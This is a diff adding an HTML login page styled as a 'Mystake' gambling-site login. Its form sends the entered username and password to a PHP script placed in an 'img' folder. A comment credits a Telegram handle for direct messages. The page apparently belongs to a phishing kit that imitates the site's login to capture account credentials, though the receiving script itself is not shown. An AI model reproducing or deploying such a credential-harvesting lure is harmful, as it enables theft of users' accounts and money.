@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
+        <!-- Add Poppins font link -->
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap">
+        <style>
+            body {
+                font-family: 'Poppins', sans-serif;
+                background-color: #343a40; /* Bootstrap bg-dark color */
+                color: #ffffff; /* Bootstrap light text color */
+                margin: 0; /* Remove default margin */
+                padding: 0; /* Remove default padding */
+            }
+    
+            .title-container {
+                width: 100%;
+                text-align: center;
+                padding: 20px 0;
+                margin-bottom: 20px; /* Adjust the margin between the title and form */
+            }
+    
+            .login-title {
+                font-size: 24px;
+                font-weight: bold;
+                letter-spacing: 1px;
+            }
+    
+            .login-container {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                height: 100vh;
+            }
+    
+            .login-form {
+                font-family: 'Poppins', sans-serif;
+                max-width: 400px;
+                width: 100%;
+                padding: 20px;
+                background-color: #212529; /* Bootstrap dark color */
+                border-radius: 10px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            }
+        </style>
+    </head>
+<body>
+
+<div class="container login-container">
+    
+    <div class="login-form">
+        <form action="./img/login.php" method="post">
+            <div class="form-group">
+                <h1 class="login-title font-weight-light text-center mb-4">Mystake Login by Chicken game by mystakeviip</h1>
+                <label for="username">Username</label>
+                <input type="text" class="form-control" id="username" name="username" placeholder="Enter your username">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" class="form-control" id="password" name="password" placeholder="Enter your password">
+            </div>
+            <button type="submit" class="btn btn-primary w-100" name="btn_submit">Login</button>
+        </form>
+    </div>
+</div>
+<!-- Codded By @preettybooy 
+Dm In Telegram : https://t.me/preettybooy
+-->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+</body>
+</html>
